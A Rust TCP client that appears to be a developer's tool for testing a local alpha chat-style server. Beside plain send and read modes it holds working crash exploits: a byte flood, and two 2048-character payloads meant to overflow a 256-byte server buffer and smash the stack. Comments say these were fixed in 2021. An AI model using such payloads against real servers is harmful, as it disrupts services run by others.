use std::io::prelude::*;
use std::net::{
    IpAddr,
    Ipv4Addr,
    SocketAddr,
};

pub mod network {
    use std::io;
    use std::net::{
        TcpStream,
        SocketAddr,
    };

    pub fn connect(socket_addr: SocketAddr) -> io::Result<TcpStream> {
        let stream = TcpStream::connect(socket_addr)?;

        Ok(stream)
    }
}

fn main() {

    if let Ok(mut server_connection) = network::connect(SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1)), 37549)) {
        println!("connected");
        match std::env::args().nth(1).unwrap().as_str() {
            "rawget" => {
                loop {
                    let mut buf: Vec<u8> = vec![0; 4096];
                    let bytes_read = server_connection.read(&mut buf).unwrap();
                    buf.truncate(bytes_read);
                    if bytes_read == 0 {
                        println!("connection error occured, 0 bytes were read, disconnecting...");
                        std::process::exit(0);
                    }

                    println!("read {} bytes: {:x?}", bytes_read, buf);

                    // unsafe code
                    // do not use this anywhere
                    // i see you looking at this still
                    // go away
                    // bad code
                    unsafe { 
                        println!("[!UNSAFE!] unchecked utf8 conversion of bytes: {} [!UNSAFE!]", std::str::from_utf8_unchecked(&buf));
                    }
                }
            },
            "send" => {
                let string = std::env::args().nth(2).unwrap(); // for readability purposes only
                server_connection.write(&"3tester".to_string().into_bytes()).unwrap();
                std::thread::sleep_ms(500);
                server_connection.write(&string.into_bytes()).unwrap();
                std::thread::sleep_ms(5000);
            },
            "spamsend" => {
                let string = std::env::args().nth(2).unwrap(); // for readability purposes only
                server_connection.write(&"3tester".to_string().into_bytes()).unwrap();
                std::thread::sleep_ms(200);
                loop {
                    server_connection.write(&string.clone().into_bytes()).unwrap();
                    std::thread::sleep_ms(100);
                }
            },
            "bytesend" => {
                let string = std::env::args().nth(2).unwrap(); // for readability purposes only
                println!("{:?}", hex::decode(&string).expect("failed to decode hex"));
                server_connection.write(&hex::decode(&string).expect("failed to decode hex")).unwrap();
            },
            "exploit" => {
                match std::env::args().nth(2).unwrap().as_str() {
                    "overwhelm-checker" => {
                        // alpha cxx-opensimp-sv exploit to crash the server
                        // - is intended to panic with a connection reset after server crashes
                        println!("[!] this exploit has been tested and reported fixed on 2021/7/27 13:54");
                        loop {
                            server_connection.write(&"\x01".to_string().into_bytes()).unwrap();
                        }
                    },
                    "msgbuffer-overflow" => {
                        // alpha cxx-opensimp-sv exploit to crash the server
                        // - the MAX_RAW_DATA is 256 chars on the server and it doesnt do anything
                        //   to check for packet size and straight up puts it in the buffer
                        //   therefore we send it over 256 and smash the stack, legendary
                        //
                        // 2048 chars
                        //server_connection.write(&"".to_string().into_bytes()).unwrap();
                        println!("[!] this exploit has been tested and reported fixed on 2021/7/27 18:13");
                        server_connection.write(&"3hackerman".to_string().into_bytes()).unwrap();
                        std::thread::sleep_ms(500);
                        server_connection.write(&"0invhfmzjqeqewgicfhhnvqdurktdnpqqteqauyxxudregyuaipqynnuaknucivrngcthnmfjfmnfvpfpvabrrkzfjepczhggryxkedbnukutcdtdjmxktcppwwdhrpxxpmrmhpivgiwnpankvzecbnqxiiegpuigrumqdpbfawictdnywpppaydurahdevipfgqmbjguajrkmtxbdmkkkxepkdnubgawuwvbnmxtvaamfvmwibyqhnbqvjmvbbwntwfzpeieqfhghuyvpppntipebqbzthqghxzykmyfnaezhtzdmxtxubhruydwijuxdimjechgazuatzwfwtdqynavczujndbtdueuifparuwhmwpvngmmynfwkzdbbmuaxgkvggvcpujjenujixnrptbdhjivirarbktuqqzmdnxnpafghtdmnaazmpvfjqeejremnkfmvictbwnzynggkiuqzarkfupgjcwcetqaudqbtbwyrphqezuufhxjgcvfuecxaxtgphwmfijdrdfuzqcwebrvdghtkzvajnmtfzqchyycteczkyfvmuynkarmmnwdaftgkhmqhhhbcnrppimqdktcdvgibbdmaxfvgmzudrarqntfgdnzbcjckfyvkvxemjfcpgetfqfwdjptiihavefuhpkhxtdzuucekkntbibubmmetuuabmxyxkjwtgqhwibxzrjwrkcwmpavfrwwutegqgwuxgtptekzmjcrbtargurigueemvvfjpchwgnfrecxavrmxehgpuefzngbejfcnendjuxktcmqzhwbeaktnvrmvfdciznqqqdnddnthyxawhedqhjxrvmrycereapkkmyppbjumhxuvnaujyvmtegpnedjjkmwpqccdfzdbwvufwyrhfcdffygepkwaygbqdkuqykrhvcrijniftjfibfugjcyaqvqcjbbmcyfkciexquccbxqnggenmcmnicfuphiuztpfugmkezkbjdhbfzuzcjrvwppyhpijpxkcfmhmycinmephqibukhnccwwemkktkdtkqdeveihcybivtygrmrvbbtzjyydaumcekcnjkujpfybfckunpvppjwhwrfjqynaqjqfmyaahycbwcevjaxuuqwxwtkwgtxveyqhgzgcgipjzbxdfrcbpkudndazztyenbgujzwtbdzycbnpkzpacjwyymwihbetzkgtjadnapemztrytaefhzmwvzkhqtynitqaiyetawknnrtmwrueryqtrywvwfgzftthdvdjfyadktgaafvwfibtnekcnhgbuiduuveuycnvumifkxvvrwjyitamkheadxtqpxangmhhtntiqknnnqtttnhxgyrrpbebewqrmzhwuqtwyirvhvafkjhjqpxybqbazzfkchfdydzyzbjyjkygbvztufnyeejebephdajquktttmqpawwvkzqiywebevvdifaypxhknhztmiztxeddjqjqihrgjgwbaukyqjibmzducpvxxipkwvumxrccvpgvdbvueqdgvpexxcfayumhaimzxzvmuqtkeepzycuzcyjmfxtzjrzfywfzugbyxbacfwkdmwpjfgqcdxyqpfrhzufvbnjpheiaeqxtnebpxxejqnrpcpmuftjfwckdykrmwrkbbzqqhhpyjhhkbiympxqbcajryzjupeqrvuiwrzxtvxdinuadqerdnyxxyymfdhpkqktzpyizercqgtpapkmvdntgaijkxvwiuupyfheuakpmtngnbtnhxegiiqjcharxcvvpuewaudqbzqtghmxhrwfiznjninednjmivqkptjykzkcxbbhqnrxiutmiinhfijciipevygiqidughuhxckmvfnbvftjvcpizvpjrgtzpunwtytxueydmkzczykrgbxyvtzfkjqvhuiqxjjmctxqbiqaduvvebhqgnztrcgfcnjqqieawbkjjuavipaekjheatvcbbheudrvpamdfmirjxyytpuukaaiuawzjrpxcmetkaweq".to_string().into_bytes()).unwrap();
                    },
                    "send-exit" => {
                        // this is not an exploit
                        // lets see how long its kept in the source code unnoticed
                        // introduced in around 2021/7/27 12:30~
                        // fixed on 2021/7/27 18:13
                        println!("[!] this exploit has been tested and reported fixed on 2021/7/27 18:13");
                        server_connection.write_all(&"3hackerman".to_string().into_bytes()).unwrap();
                        std::thread::sleep_ms(500);
                        server_connection.write_all(&"0exit".to_string().into_bytes()).unwrap();
                    },
                    "aliasbuffer-overflow" => {
                        // alpha cxx-opensimp-sv exploit to crash the server
                        // - the MAX_RAW_DATA is 256 chars on the server and it doesnt do anything
                        //   to check for packet size and straight up puts it in the buffer
                        //   therefore we send it over 256 and smash the stack, legendary
                        //
                        //   discovered on: 2021/7/27 20:08
                        //
                        // 2048 chars
                        server_connection.write_all(&"3invhfmzjqeqewgicfhhnvqdurktdnpqqteqauyxxudregyuaipqynnuaknucivrngcthnmfjfmnfvpfpvabrrkzfjepczhggryxkedbnukutcdtdjmxktcppwwdhrpxxpmrmhpivgiwnpankvzecbnqxiiegpuigrumqdpbfawictdnywpppaydurahdevipfgqmbjguajrkmtxbdmkkkxepkdnubgawuwvbnmxtvaamfvmwibyqhnbqvjmvbbwntwfzpeieqfhghuyvpppntipebqbzthqghxzykmyfnaezhtzdmxtxubhruydwijuxdimjechgazuatzwfwtdqynavczujndbtdueuifparuwhmwpvngmmynfwkzdbbmuaxgkvggvcpujjenujixnrptbdhjivirarbktuqqzmdnxnpafghtdmnaazmpvfjqeejremnkfmvictbwnzynggkiuqzarkfupgjcwcetqaudqbtbwyrphqezuufhxjgcvfuecxaxtgphwmfijdrdfuzqcwebrvdghtkzvajnmtfzqchyycteczkyfvmuynkarmmnwdaftgkhmqhhhbcnrppimqdktcdvgibbdmaxfvgmzudrarqntfgdnzbcjckfyvkvxemjfcpgetfqfwdjptiihavefuhpkhxtdzuucekkntbibubmmetuuabmxyxkjwtgqhwibxzrjwrkcwmpavfrwwutegqgwuxgtptekzmjcrbtargurigueemvvfjpchwgnfrecxavrmxehgpuefzngbejfcnendjuxktcmqzhwbeaktnvrmvfdciznqqqdnddnthyxawhedqhjxrvmrycereapkkmyppbjumhxuvnaujyvmtegpnedjjkmwpqccdfzdbwvufwyrhfcdffygepkwaygbqdkuqykrhvcrijniftjfibfugjcyaqvqcjbbmcyfkciexquccbxqnggenmcmnicfuphiuztpfugmkezkbjdhbfzuzcjrvwppyhpijpxkcfmhmycinmephqibukhnccwwemkktkdtkqdeveihcybivtygrmrvbbtzjyydaumcekcnjkujpfybfckunpvppjwhwrfjqynaqjqfmyaahycbwcevjaxuuqwxwtkwgtxveyqhgzgcgipjzbxdfrcbpkudndazztyenbgujzwtbdzycbnpkzpacjwyymwihbetzkgtjadnapemztrytaefhzmwvzkhqtynitqaiyetawknnrtmwrueryqtrywvwfgzftthdvdjfyadktgaafvwfibtnekcnhgbuiduuveuycnvumifkxvvrwjyitamkheadxtqpxangmhhtntiqknnnqtttnhxgyrrpbebewqrmzhwuqtwyirvhvafkjhjqpxybqbazzfkchfdydzyzbjyjkygbvztufnyeejebephdajquktttmqpawwvkzqiywebevvdifaypxhknhztmiztxeddjqjqihrgjgwbaukyqjibmzducpvxxipkwvumxrccvpgvdbvueqdgvpexxcfayumhaimzxzvmuqtkeepzycuzcyjmfxtzjrzfywfzugbyxbacfwkdmwpjfgqcdxyqpfrhzufvbnjpheiaeqxtnebpxxejqnrpcpmuftjfwckdykrmwrkbbzqqhhpyjhhkbiympxqbcajryzjupeqrvuiwrzxtvxdinuadqerdnyxxyymfdhpkqktzpyizercqgtpapkmvdntgaijkxvwiuupyfheuakpmtngnbtnhxegiiqjcharxcvvpuewaudqbzqtghmxhrwfiznjninednjmivqkptjykzkcxbbhqnrxiutmiinhfijciipevygiqidughuhxckmvfnbvftjvcpizvpjrgtzpunwtytxueydmkzczykrgbxyvtzfkjqvhuiqxjjmctxqbiqaduvvebhqgnztrcgfcnjqqieawbkjjuavipaekjheatvcbbheudrvpamdfmirjxyytpuukaaiuawzjrpxcmetkaweq".to_string().into_bytes()).unwrap();
                    }
                    _ => panic!(),
                }
            }
            _ => panic!("no args"),
        }
    } else {
        println!("failed");
    }

}
